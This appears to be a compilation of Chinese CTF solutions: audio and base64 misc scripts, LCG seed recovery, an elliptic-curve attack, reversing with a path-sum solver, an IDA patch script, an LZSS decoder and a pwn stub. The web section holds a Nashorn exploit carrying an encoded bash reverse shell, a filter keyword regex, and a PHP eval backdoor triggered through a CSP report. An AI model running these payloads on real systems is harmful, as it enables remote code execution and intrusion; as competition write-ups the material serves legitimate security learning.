client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)

mp3dict=load_mp3('./存在padding的文件/')[1]

wavpath='./flagwav/'     #调试数据所在目录
if not os.path.exists(wavpath):
    os.mkdir(wavpath)

res=[]
for i in range(48):
    wavname='./flagwav/'+str(i)+'.wav'

    cmd="ffmpeg.exe -i {} -f wav -ac 1 -ar 16000 {}".format(mp3dict[i],wavname)   #调用ffmpeg.exe

    p=Popen(cmd,shell=True,stdout=open("process.out", "w"), close_fds=True)
    p.wait()

    with open(wavname, 'rb') as f:
        fp= f.read()
        # 识别本地文件
    try:
        result = client.asr(fp, 'wav', 16000, {'dev_pid': 1737})
# 默认1537（普通话 输入法模型），1737是英语
        tmp=result['result'][0][:-1]
        res.append((i,tmp))
        # print(tmp,end='')
    
except Exception as e:
        print(e)
open("结果识别.txt",'w').write(''.join([str(i)+'n' for i in res]))

zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi

import string
from base64 import * 

ss=set('abcdef'+string.digits+'flag{}-')
text1='zmvhngzjytatodbimi00ntfilwjjmzutzdfknja0zdq0mmvi'   #因为数量不多,我们尝试用耳朵听出来

def alls(text):
    res=[""]
    for i in (text):
        if not i.isalpha():
            for j in range(len(res)):
                res[j] += i
        else:
            for k in range(len(res)):
                tmp = res[k]
                res[k] += i.lower()
                res.append(tmp + i.upper())
    return res

for i in range(0,len(text1),4):
    t=(text1[i:i+4])
    res=alls(t)
    for j in res:
        try:
            tmp=b64decode(j.encode()).decode()
            if set(tmp).issubset(ss):  #字符串是0-9a-fflag{}-的子集的话,即uuid格式
                print(tmp,end='')

        
except Exception as e:
            continue
# print(tmp)

已知a,b,N,num1
num1 = (seed *a + b ) % N
由于b比N小则
num1 - b = seed * a % N
由于取模，则需要模数逆推
seed = (num1-b)*inverse(a,N)%N

def solve1(N,a,b,n1):
    return (n1-b)*inverse(a,N) % N

已知a,N,num1,num2
需要先通过num1,num2求出b
由于num2 = (num1 *a + b ) % N
b = (n2-n1 * a)%N
然后再带入def solve1()就行

def solve2(N,a,n1,n2):
    b = (n2-n1 * a)%N
    return solve1(N,a,b,n1)

这次只知道num1,num2,num3,N
需要求出a然后带入solve2中求出b
num3 = (num2*a + b) %N
num2 = (num1*a + b) %N
->
num3-b = num2*a % N
num2-b = num1*a % N
->
num3 - num2 = num2*a % N - num1*a %N
->
num3 - num2 = a*(num2-num1) % N
->
a = (num3-num2)*inverse(num2-num1,N) %N

def solve3(N,n1,n2,n3):
    a = (n3-n2)*inverse(n2-n1,N) %N
    return solve2(N,a,n1,n2)

只知道6个连续的随机数,这次就不能用线性方程组了,因为对与每一个方程,它的模数都是未知的.
5个方程就会多出5个未知数
但是如果多个随机数分别乘n,那么gcd就可能等于n
我们可以设置几个模0式,然后进行gcd运算,可以在模数未知的情况下通过多个未知数序列算出模数

跟solve3有类似的地方
s1 = num2-num1 ->(num2*a+b) -(num1*a+b) = a*(num2-num1) = a*s1 %N
s2 = num3-num2 ->(num3*a+b) -(num2*a+b) = a*(num3-num2) = a*s2 %N
s3 = num4-num3
s4 = num5-num4
s5 = num6-num5
那么t1-6就有共同的模数
再做出模0式,可以互乘再做差
t3*t1-t2**2
t5*t2-t4*t3
然后进行gcd求n
N = GCD(t3*t1-t2**2,t5*t2-t4*t3)
但是此时的N不一定是素数,只是接近true_N,那么就可以用光滑阶进行求解
F = factorint(N)
F.items() -> p,q
N = N / pow(p,q)

def solve4(num1,num2,num3,num4,num5,num6):
    s1 = num2-num1
    s2 = num3-num2
    s3 = num4-num3
    s4 = num5-num4
    s5 = num6-num5
    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)
    F = factorint(N)
    while 1:
        if isPrime(int(N)):
            return solve3(N,num1,num2,num3)
        else:
            for p,q in F.items():
                if p.bit_length()>128:
                    continue
                N = N/pow(p,q)

from pwn import *
from sympy import factorint
from Crypto.Util.number import *
context.log_level = 'debug'
#io = remote("0.0.0.0",10000)

def solve1(N,a,b,num1):
    return (num1-b)*inverse(a,N) % N
def solve2(N,a,num1,num2):
    b = (num2-num1 * a)%N
    return solve1(N,a,b,num1)
def solve3(N,num1,num2,num3):
    a = (num3-num2)*inverse(num2-num1,N) %N
    return solve2(N,a,num1,num2)
def solve4(num1,num2,num3,num4,num5,num6):
    s1 = num2-num1
    s2 = num3-num2
    s3 = num4-num3
    s4 = num5-num4
    s5 = num6-num5
    N = GCD(s3*s1-s2**2,s5*s2-s4*s3)
    F = factorint(N)
    while 1:
        if isPrime(int(N)):
            return solve3(N,num1,num2,num3)
        else:
            for p,q in F.items():
                if p.bit_length()>128:
                    continue
                N = N/pow(p,q)

def challenge1():
    io.recvuntil("a=")
    a = int(io.recvline().strip())
    io.recvuntil("b=")
    b = int(io.recvline().strip())
    io.recvuntil("N=")
    N = int(io.recvline().strip())
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    seed = solve1(N,a,b,num1)
    io.recvuntil("seed = ")
    io.sendline(str(seed))

def challenge2():
    io.recvuntil("a=")
    a = int(io.recvline().strip())
    io.recvuntil("N=")
    N = int(io.recvline().strip())
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    io.recvuntil("num2=")
    num2 = int(io.recvline().strip())
    seed = solve2(N,a,num1,num2)
    io.recvuntil("seed = ")
    io.sendline(str(seed))

def challenge3():
    io.recvuntil("N=")
    N = int(io.recvline().strip())
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    io.recvuntil("num2=")
    num2 = int(io.recvline().strip())
    io.recvuntil("num3=")
    num3 = int(io.recvline().strip())
    seed = solve3(N,num1,num2,num3)
    io.recvuntil("seed = ")
    io.sendline(str(seed))

def challenge4():
    io.recvuntil("num1=")
    num1 = int(io.recvline().strip())
    io.recvuntil("num2=")
    num2 = int(io.recvline().strip())
    io.recvuntil("num3=")
    num3 = int(io.recvline().strip())
    io.recvuntil("num4=")
    num4 = int(io.recvline().strip())
    io.recvuntil("num5=")
    num5 = int(io.recvline().strip())
    io.recvuntil("num6=")
    num6 = int(io.recvline().strip())
    seed = solve4(num1,num2,num3,num4,num5,num6)
    io.recvuntil("seed = ")
    io.sendline(str(seed))
for i in range(50):
    challenge1()
    print(i)
for i in range(30):
    challenge2()
    print(i)
for i in range(20):
    challenge3()
    print(i)
challenge4()

io.interactive()

from Crypto.Util.number import *

p = 101202160159081561029549739902097099275439197324107563340103725793005952286427
a = 77352628233208904456190113484930965015529164818065903310716894212030514274681
g = 60481606253840272416608492349866939317114665311741132450767745324720776050313

with open('output.txt', 'r') as f:
    data = f.readlines()
    G = eval(data[0])
    Q = eval(data[1])
    leak = eval(data[2])

Qpp = Qp(p, prec=666)
s2 = (Qpp(leak).log() / Qpp(g).log()).lift()
print(long_to_bytes(s2))

b = (G[1]^2 - G[0]^3 - a*G[0]) % p^5

Fp5 = Zmod(p^5)
E = EllipticCurve(Fp5, [a, b])

p_ord = E.change_ring(GF(p)).order()

EQp = E.change_ring(Qp(p))
QpG = EQp(G) * p_ord
QpQ = EQp(Q) * p_ord

phiG = -QpG[0] / QpG[1]
phiQ = -QpQ[0] / QpQ[1]

s1 = ZZ(phiQ / phiG)
print(long_to_bytes(s1))

+ + + + + + + + + + +

✦  +

+

有话说

如果您有比赛想要宣传，欢迎联系我们刊登发布

如果您想练习历史大赛CTF题目，欢迎体验演武场

扫描关注下方春秋GAME官方公众号

发送“了解”两字即可了解更多以及加入春秋赛事宇宙官方微信群

春秋GAME期待与您的见面~~~

+ + + + + + + + + + +


```
"process|runtime|javascript|\+|char|\\|from|\[|\]|load"
java.lang.Runtime.getRuntime().exec("bash -c {echo,ZWNobyxiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMQ==}|{base64,-d}|{bash,-i}").getInputStream()
%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29
最终exp:
{
"cmd":"import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName("nashorn").eval(java.net.URLDecoder.decode("%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29"));",
"x":"guanzhujiarandundunjiechbO"
}
<?php
if($_SERVER['REMOTE_ADDR']!=='127.0.0.1'){
    die('only from local!');
}
else{
    $postdata = file_get_contents('php://input');
    $kv_list = explode('&',$postdata);
    if(count($kv_list)>0){
        foreach ($kv_list as $value){
            $kv = explode('=',$value);
            if(count($kv)==2){
                if($kv[0]==="bbzl's shell"){
                    eval($kv[1]);
                }
            }
        }
    }
}
Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26
{"csp-report":{"document-uri":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&","disposition":"report","blocked-uri":"http://124.221.138.51/img/1.jpg","line-number":2,"source-file":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","status-code":
200,"script-sample":""}}
0x00001251 <+4>:    push   ebp
0x00001252 <+5>:    mov    ebp,esp
0x00001254 <+7>:    sub    esp,0x10
0x00001257 <+10>:    mov    DWORD PTR [ebp-0x10],0x0
0x0000125e <+17>:    mov    DWORD PTR [ebp-0xc],0x0
0x00001265 <+24>:    mov    eax,DWORD PTR [ebp-0x10]
0x00001268 <+27>:    imul   edx,eax,0xc8
0x0000126e <+33>:    mov    eax,DWORD PTR [ebp+0x10]
0x00001271 <+36>:    add    edx,eax
0x00001273 <+38>:    mov    eax,DWORD PTR [ebp-0xc]
0x00001276 <+41>:    mov    eax,DWORD PTR [edx+eax*4]
0x00001279 <+44>:    mov    DWORD PTR [ebp-0x8],eax
0x0000127c <+47>:    mov    DWORD PTR [ebp-0x4],0x0
0x00001283 <+54>:    jmp    0x12dd <verify+144>
0x00001285 <+56>:    mov    edx,DWORD PTR [ebp-0x4]
0x00001288 <+59>:    mov    eax,DWORD PTR [ebp+0x8]
0x0000128b <+62>:    add    eax,edx
0x0000128d <+64>:    movzx  eax,BYTE PTR [eax]
0x00001290 <+67>:    cmp    al,0x52
0x00001292 <+69>:    jne    0x12a0 <verify+83>
0x00001294 <+71>:    cmp    DWORD PTR [ebp-0xc],0x30
0x00001298 <+75>:    jg     0x12a0 <verify+83>
0x0000129a <+77>:    add    DWORD PTR [ebp-0xc],0x1
0x0000129e <+81>:    jmp    0x12c2 <verify+117>
0x000012a0 <+83>:    mov    edx,DWORD PTR [ebp-0x4]
0x000012a3 <+86>:    mov    eax,DWORD PTR [ebp+0x8]
0x000012a6 <+89>:    add    eax,edx
0x000012a8 <+91>:    movzx  eax,BYTE PTR [eax]
0x000012ab <+94>:    cmp    al,0x44
0x000012ad <+96>:    jne    0x12bb <verify+110>
0x000012af <+98>:    cmp    DWORD PTR [ebp-0x10],0x30
0x000012b3 <+102>:    jg     0x12bb <verify+110>
0x000012b5 <+104>:    add    DWORD PTR [ebp-0x10],0x1
0x000012b9 <+108>:    jmp    0x12c2 <verify+117>
0x000012bb <+110>:    mov    eax,0x0
0x000012c0 <+115>:    jmp    0x12f1 <verify+164>
0x000012c2 <+117>:    mov    eax,DWORD PTR [ebp-0x10]
0x000012c5 <+120>:    imul   edx,eax,0xc8
0x000012cb <+126>:    mov    eax,DWORD PTR [ebp+0x10]
0x000012ce <+129>:    add    edx,eax
0x000012d0 <+131>:    mov    eax,DWORD PTR [ebp-0xc]
0x000012d3 <+134>:    mov    eax,DWORD PTR [edx+eax*4]
0x000012d6 <+137>:    add    DWORD PTR [ebp-0x8],eax
0x000012d9 <+140>:    add    DWORD PTR [ebp-0x4],0x1
0x000012dd <+144>:    mov    eax,DWORD PTR [ebp-0x4]
0x000012e0 <+147>:    cmp    eax,DWORD PTR [ebp+0xc]
0x000012e3 <+150>:    jl     0x1285 <verify+56>
0x000012e5 <+152>:    mov    eax,DWORD PTR [ebp-0x8]
0x000012e8 <+155>:    cmp    eax,DWORD PTR [ebp+0x14]
0x000012eb <+158>:    sete   al
0x000012ee <+161>:    movzx  eax,al
0x000012f1 <+164>:    leave  
0x000012f2 <+165>:    ret
int verify(const char* input, int size, int map[50][50], int max_val) {
    int x=0, y=0;
    int sum = map[x][y];
    for(int i = 0;i<size;++i) {
        if(input[i] == 'R' && y<49) {
            ++y;
        } else if (input[i]=='D' && x<49) {
            ++x;
        } else {
            return 0;
        }
        sum += map[x][y];
    }
    return sum == max_val;
}
def get_solution(arr):
    dp = [[0 for j in range(50)] for i in range(50)]
    dp[0][0] = arr[0][0]
    for i in range(1, 50):
        dp[0][i] = dp[0][i-1] + arr[0][i]
    for i in range(1, 50):
        dp[i][0] = dp[i-1][0] + arr[i][0]
    for i in range(1, 50):
        for j in range(1, 50):
            dp[i][j] = max(dp[i][j-1], dp[i-1][j]) + arr[i][j]

    max_val = 0
    max_idx = 0
    for i in range(50):
        if dp[49][i] > max_val:
            max_val = dp[49][i]
            max_idx = i

    if dp[49].count(max_val) > 1:
        #print("Multi solution!")
        return None

    sol = ""
    level = 49
    while level > 0:
        if max_idx > 0:
            if dp[level][max_idx-1] > dp[level-1][max_idx]:
                sol = "R" + sol
                max_idx = max_idx - 1
            elif dp[level][max_idx-1] < dp[level-1][max_idx]:
                sol = "D" + sol
                level = level - 1
            else:
                #print("Multi solution!")
                return None
        else:
            sol = "D" + sol
            level = level - 1

    for i in range(max_idx):
        sol = "R" + sol

    return sol, max_val, dp

arr = [
  [31,59,162,34,11,176,34,153,214,239,218,184,200,169,189,168,168,75,172,184,132,174,33,214,238,31,71,144,229,209,235,214,39,53,19,190,222,192,31,92,55,29,6,239,233,157,64,88,94,239],
  [11,117,166,47,72,16,6,70,190,177,110,123,56,36,209,44,152,130,13,162,35,11,112,187,92,226,123,192,209,201,132,150,100,188,253,120,210,247,172,25,63,74,86,208,60,38,9,151,108,99],
  [45,117,151,132,252,117,105,170,183,87,123,43,45,207,162,13,146,114,76,220,209,31,178,84,210,196,221,62,36,12,1,155,86,150,220,204,145,228,119,38,240,107,137,105,227,18,185,78,36,24],
  [240,122,104,46,183,177,96,65,65,222,69,211,192,222,233,7,36,34,55,139,154,135,95,36,124,94,133,61,208,140,223,194,176,156,243,68,51,83,138,235,30,249,172,151,121,171,172,205,147,53],
  [90,14,62,152,181,58,208,251,210,178,70,37,235,45,88,78,219,183,103,35,19,173,232,160,13,36,250,252,214,33,176,190,115,113,216,210,160,150,100,237,4,37,10,110,139,6,68,252,53,22],
  [154,7,3,33,93,55,42,111,112,137,228,172,208,111,68,110,48,20,238,226,110,54,42,164,64,211,226,228,29,3,50,206,141,220,244,59,155,19,195,129,105,188,181,151,232,204,209,149,211,22],
  [155,113,94,226,183,51,57,202,68,84,222,44,32,71,172,100,22,15,153,91,97,183,62,48,149,51,235,122,208,161,24,142,1,215,223,234,162,158,228,193,146,182,85,175,133,138,15,225,24,182],
  [182,177,51,87,231,126,112,84,173,206,223,2,137,76,216,125,132,229,59,52,134,65,195,112,122,190,250,23,240,70,182,39,171,255,67,143,84,53,254,238,238,25,143,17,249,211,72,121,109,57],
  [245,140,112,220,67,65,112,52,46,186,252,130,249,236,194,92,196,53,211,179,91,119,83,6,184,205,248,233,159,130,204,130,143,171,227,30,167,23,146,134,166,11,128,64,251,119,160,23,59,24],
  [162,54,17,217,11,127,203,183,251,171,237,202,188,202,52,39,109,175,127,193,11,248,10,99,212,8,183,147,134,228,111,148,13,50,186,67,85,16,242,216,192,128,129,28,82,15,173,129,92,224],
  [119,69,43,81,75,180,69,109,11,250,14,241,124,193,137,144,53,175,165,39,211,135,247,173,243,253,44,213,92,192,145,138,217,104,18,82,252,101,135,90,55,115,248,235,256,139,78,42,239,17],
  [132,221,29,180,170,62,26,140,34,199,161,66,66,28,250,53,237,42,223,5,42,15,31,109,68,141,35,239,142,5,80,12,75,123,12,181,139,131,167,173,72,107,150,252,242,106,240,12,79,147],
  [194,65,155,224,195,186,208,73,221,132,120,73,110,28,91,204,111,199,127,164,166,204,250,11,209,209,81,237,146,125,233,177,79,140,175,44,13,56,179,82,80,227,167,105,170,13,248,251,72,152],
  [222,223,7,195,246,248,255,115,188,106,85,117,244,35,191,43,135,254,172,234,101,70,105,96,30,248,37,39,168,256,156,24,130,96,169,99,93,136,223,151,76,71,101,239,178,188,11,191,82,2],
  [41,15,2,40,221,165,207,22,81,239,150,139,161,78,246,87,120,70,121,125,244,238,176,56,35,173,24,196,47,66,197,228,153,55,204,151,251,81,87,184,43,247,226,155,62,219,65,38,48,241],
  [226,163,167,252,187,253,65,138,251,229,236,203,79,71,213,55,36,232,29,173,156,41,174,131,90,31,129,14,66,247,153,122,228,192,14,180,118,223,213,255,53,143,205,1,166,189,155,19,13,116],
  [111,115,183,159,38,251,99,65,84,84,97,247,217,188,2,80,141,149,173,115,131,141,72,107,106,203,162,90,20,47,156,99,99,56,121,190,240,201,87,156,0,96,196,12,122,175,24,195,73,184],
  [116,17,63,197,252,226,159,220,105,247,138,234,171,86,187,108,11,104,123,207,255,122,24,62,249,217,50,231,54,64,134,5,140,239,171,125,128,115,178,120,107,46,64,125,78,112,128,241,24,27],
  [74,163,34,13,2,168,126,60,219,19,31,82,44,175,124,8,223,32,12,208,119,36,206,110,61,210,157,202,228,96,199,115,77,109,160,78,194,124,73,254,141,1,97,249,12,27,153,193,51,207],
  [78,182,92,255,94,256,244,173,51,197,28,34,178,143,173,197,94,132,194,244,24,240,3,162,66,68,182,102,20,71,131,142,105,122,121,157,61,185,203,227,110,110,117,5,225,73,57,129,132,25],
  [100,113,138,85,153,115,154,167,132,80,36,23,111,86,221,42,196,98,113,89,175,19,145,140,150,51,6,21,184,213,162,101,252,115,36,165,186,145,176,8,102,1,206,30,119,56,130,185,61,226],
  [109,237,182,134,35,117,127,49,111,90,141,83,239,141,60,105,214,107,62,25,250,133,254,105,97,141,187,230,110,180,178,192,206,49,242,71,138,168,105,57,63,247,47,148,80,5,117,123,147,188],
  [136,10,134,193,227,229,232,185,119,238,123,0,172,27,17,73,1,86,43,41,188,16,90,146,229,230,3,215,25,193,143,232,17,193,195,256,242,38,182,73,25,140,17,178,89,78,247,1,133,22],
  [65,220,147,60,28,101,152,106,218,245,127,254,37,118,224,192,46,123,16,203,23,138,57,50,256,227,198,180,177,25,141,87,111,234,103,10,148,73,91,15,36,105,79,129,90,79,170,217,87,181],
  [12,76,85,27,62,115,116,221,166,243,97,135,142,223,192,220,33,86,30,135,142,143,78,249,137,56,218,34,186,111,121,31,184,230,12,195,189,31,20,148,59,233,179,20,141,179,147,60,194,175],
  [247,108,209,92,201,117,164,253,211,194,114,62,59,103,123,228,39,100,62,243,164,169,224,35,59,94,6,10,187,116,44,152,55,117,37,227,49,145,133,235,31,18,215,2,168,42,154,68,184,10],
  [93,0,200,198,247,163,123,117,98,44,158,61,114,11,56,3,128,39,105,0,176,29,100,2,119,115,145,135,138,28,4,119,166,183,45,249,196,192,90,161,126,214,161,42,202,150,70,245,62,123],
  [12,59,139,135,117,158,90,0,121,255,105,58,26,247,213,105,205,125,232,54,238,210,9,101,85,96,94,151,118,48,125,119,77,236,66,75,241,108,90,85,137,88,19,166,245,108,33,208,154,88],
  [230,149,85,121,249,128,165,106,85,137,161,25,247,253,95,254,132,123,17,10,230,72,206,174,168,228,250,164,79,12,77,195,219,209,211,208,57,247,165,254,250,203,48,199,6,49,112,31,172,78],
  [21,97,244,163,61,138,24,93,235,187,107,49,231,129,166,168,105,213,188,120,81,136,70,129,78,246,118,160,230,66,83,99,250,176,99,21,109,172,99,235,86,180,145,99,49,31,99,126,198,47],
  [72,75,7,120,42,113,216,241,46,207,34,176,37,117,84,20,86,214,136,125,61,44,216,61,177,66,182,134,108,64,94,91,4,12,244,131,20,254,121,237,26,199,57,217,43,40,57,1,124,234],
  [125,96,128,252,63,0,161,130,104,115,21,70,223,4,212,68,45,233,143,124,40,238,249,3,206,176,102,188,208,120,186,252,16,155,94,235,67,25,226,119,136,244,25,156,240,244,193,17,218,169],
  [148,20,159,113,52,168,229,213,172,200,70,244,69,168,195,96,168,152,200,47,123,139,120,116,192,14,134,145,163,199,196,120,174,70,21,234,22,88,102,127,55,22,245,19,16,187,114,119,252,112],
  [54,237,256,58,55,182,70,66,214,177,126,106,80,65,218,235,191,94,213,252,57,165,13,190,224,52,11,36,208,141,119,194,231,253,16,169,239,37,25,251,1,241,247,133,12,34,244,86,67,43],
  [29,40,108,109,205,7,88,206,29,221,123,141,251,76,64,68,204,228,57,195,15,188,6,113,46,174,116,40,71,125,180,240,10,23,18,226,240,208,180,57,53,205,205,101,64,97,63,251,77,106],
  [176,146,160,144,239,64,63,255,105,121,75,204,194,66,168,166,253,54,84,33,185,175,146,86,54,87,127,141,14,170,248,81,26,21,25,194,9,24,241,213,185,43,144,133,112,142,7,55,17,49],
  [156,27,118,8,111,22,164,28,80,16,69,23,14,14,181,141,48,15,161,46,92,79,198,212,121,42,41,0,206,186,81,42,166,158,33,104,153,7,181,88,164,105,29,247,10,211,98,103,224,186],
  [38,122,27,198,206,166,139,212,204,199,125,209,190,166,162,1,109,126,251,106,181,176,31,93,89,70,103,193,153,102,154,253,116,72,61,214,46,63,154,142,127,34,80,166,230,12,75,139,204,25],
  [79,27,105,30,175,107,158,21,179,84,48,202,38,87,148,250,145,49,147,112,82,93,234,8,144,161,201,55,9,250,249,19,245,51,211,143,226,214,30,66,199,18,98,243,142,96,119,254,13,145],
  [73,17,241,93,126,64,243,182,131,74,8,8,130,241,256,58,121,207,106,112,172,63,244,166,135,81,104,157,117,116,19,138,123,33,164,202,238,216,23,230,29,117,186,237,193,213,70,200,137,204],
  [175,43,178,24,125,9,90,208,133,2,31,135,207,158,76,114,255,159,14,207,218,208,255,16,244,121,135,11,94,132,175,222,6,101,171,27,134,2,181,175,222,63,243,204,98,30,44,35,69,175],
  [244,190,74,183,118,189,148,86,238,194,232,33,219,21,103,191,175,150,228,1,205,34,51,189,222,127,61,144,78,160,155,117,74,222,192,189,116,101,243,50,6,212,60,76,90,87,93,135,215,235],
  [56,110,105,28,52,42,145,7,196,110,229,237,219,243,141,73,30,73,123,108,149,144,236,202,108,10,72,160,16,111,173,22,235,86,86,174,185,44,78,144,200,118,33,158,190,3,255,10,148,83],
  [249,147,83,224,170,122,14,241,126,36,248,46,246,25,228,143,26,146,210,47,0,28,122,206,213,179,69,163,189,187,149,128,171,168,200,110,187,256,238,125,250,118,15,106,14,38,119,179,1,209],
  [68,79,154,139,71,117,130,98,136,160,146,74,137,107,115,108,233,242,199,206,19,223,147,44,100,33,77,70,66,173,131,85,68,63,92,87,79,239,96,176,164,203,50,53,256,89,77,88,126,7],
  [130,11,151,11,201,119,165,163,189,120,22,170,46,138,136,118,153,250,70,164,208,230,150,156,53,28,243,46,166,54,143,192,225,225,253,5,212,138,235,179,95,255,195,68,248,105,192,237,121,14],
  [236,204,77,120,79,191,176,77,38,221,97,170,41,9,96,195,70,18,96,28,13,51,87,225,2,28,218,230,53,253,171,83,83,224,41,31,247,126,228,254,115,0,87,33,29,85,200,113,158,187],
  [22,186,66,8,171,180,195,151,204,157,211,141,217,67,80,20,58,21,233,115,62,111,166,210,65,95,252,139,80,223,31,6,226,204,92,197,122,133,51,64,191,250,203,118,144,135,247,97,35,10],
  [45,144,167,46,138,170,169,113,202,58,93,86,29,118,43,121,228,93,120,71,113,99,185,102,64,5,247,123,224,214,148,132,166,49,238,199,211,197,243,48,55,103,74,73,218,62,200,47,73,135],
  [27,128,70,245,100,225,76,201,20,130,112,132,45,92,143,12,12,159,238,142,184,181,152,227,113,67,53,232,203,192,177,94,88,211,11,231,41,232,0,48,161,9,107,80,138,190,230,166,250,102],
]

if __name__ == "__main__":
    sol, max_val, dp = get_solution(arr)
    print(sol)
RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR
RRDDRRDRRDRRRDRDDDDRRRDRDDRRRDRRDRRRDRDRDRDRRRDDRDRRRRDDDDDDDRDDRDDDDDDDDRDDDDDRDDRDRRDRRRRRRDDRRR
Good job
flag{333b61656d554e1e200208247b73}
import idc

st = MinEA()
ed = MaxEA()
ea = st
while ea < ed:
    if Byte(ea) == 0x75 and Byte(ea+1) == 0x03 and Byte(ea+2) == 0x74 and Byte(ea+3) == 0x01 and Byte(ea+4) == 0xe8:
        print("发现花指令")    
        patch_byte(ea, 0x90)
        patch_byte(ea+1, 0x90)
        patch_byte(ea+2, 0x90)
        patch_byte(ea+3, 0x90)
        patch_byte(ea+4, 0x90)
    ea += 1
    #include <string.h>
    #include <stdio.h>

    #define BYTE unsigned char
    #define WORD unsigned short
    #define DWORD unsigned int

    #define TRUE 1
    #define FALSE 0

BYTE bThreshold;  //压缩阈值、长度大于等于2的匹配串才有必要压缩

BYTE bPreBufSizeBits;  //前向缓冲区占用的比特位
BYTE bWindowBufSizeBits;  //滑动窗口占用的比特位

WORD wPreBufSize;  //通过占用的比特位计算缓冲区大小
WORD wWindowBufSize;  //通过占用的比特位计算滑动窗口大小

BYTE bPreBuf[1024];  //前向缓冲区
BYTE bWindowBuf[8192];  //滑动窗口
BYTE bMatchString[1024];  //匹配串
WORD wMatchIndex;  //滑动窗口匹配串起始下标

BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex);
DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName);

int main()
{
    bThreshold = 3;
    bPreBufSizeBits = 8;
    bWindowBufSizeBits = 16 - bPreBufSizeBits;
    wPreBufSize = ((WORD)1 << bPreBufSizeBits) - 1 + bThreshold;
    wWindowBufSize = ((WORD)1 << bWindowBufSizeBits) - 1 + bThreshold;

    LZSS_decode("out", "decode.txt");
    return 0;
}

BYTE FindSameString(BYTE *pbStrA, WORD wLenA, BYTE *pbStrB, WORD wLenB, WORD *pwMatchIndex)
{
    WORD i, j;

    for (i = 0; i < wLenA; i++)
    {
        if ((wLenA - i) < wLenB)
        {
            return FALSE;
        }

        if (pbStrA[i] == pbStrB[0])
        {
            for (j = 1; j < wLenB; j++)
            {
                if (pbStrA[i + j] != pbStrB[j])
                {
                    break;
                }
            }

            if (j == wLenB)
            {
                *pwMatchIndex = i;
                return TRUE;
            }
        }
    }
    return FALSE;
}

DWORD LZSS_decode(char *pbReadFileName, char *pbWriteFileName)
{
    WORD i, j;
    BYTE bItemNum;
    BYTE bFlag;
    WORD wStart;
    WORD wMatchStringCnt = 0;
    WORD wWindowBufCnt = 0;
    FILE *pfRead = fopen(pbReadFileName, "rb");
    FILE *pfWrite = fopen(pbWriteFileName, "wb");

    while (0 != fread(&bFlag, 1, 1, pfRead))
    {
        for (bItemNum = 0; bItemNum < 8; bItemNum++)
        {
            if (0 == (bFlag & ((BYTE)1 << (7 - bItemNum))))
            {
                if (fread(bPreBuf, 1, 1, pfRead) < 1)
                {
                    goto LZSS_decode_out_;
                }
                fwrite(bPreBuf, 1, 1, pfWrite);
                bMatchString[0] = bPreBuf[0];
                wMatchStringCnt = 1;
            }
            else
            {
                if (fread(bPreBuf, 1, 2, pfRead) < 2)
                {
                    goto LZSS_decode_out_;
                }
                wStart = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] << 8)) / ((WORD)1 << bPreBufSizeBits);  
                wMatchStringCnt = ((WORD)bPreBuf[0] | ((WORD)bPreBuf[1] << 8)) % ((WORD)1 << bPreBufSizeBits) + bThreshold;
                fwrite(&bWindowBuf[wStart], 1, wMatchStringCnt, pfWrite);
                memcpy(bMatchString, &bWindowBuf[wStart], wMatchStringCnt);
            }
            if ((wWindowBufCnt + wMatchStringCnt) > wWindowBufSize)
            {
                j = (wWindowBufCnt + wMatchStringCnt) - wWindowBufSize;
                for (i = 0; i < wWindowBufCnt - j; i++)
                {
                    bWindowBuf[i] = bWindowBuf[i + j];
                }
                wWindowBufCnt -= j;
            }
            memcpy(&bWindowBuf[wWindowBufCnt], bMatchString, wMatchStringCnt);
            wWindowBufCnt += wMatchStringCnt;
        }
    }

LZSS_decode_out_:

    fclose(pfRead);
    fclose(pfWrite);
    return 0;
}
from pwn import*
context.log_level=True
    #p=process('./stack')
p=remote("127.0.0.1",8665)
elf=ELF('stack')
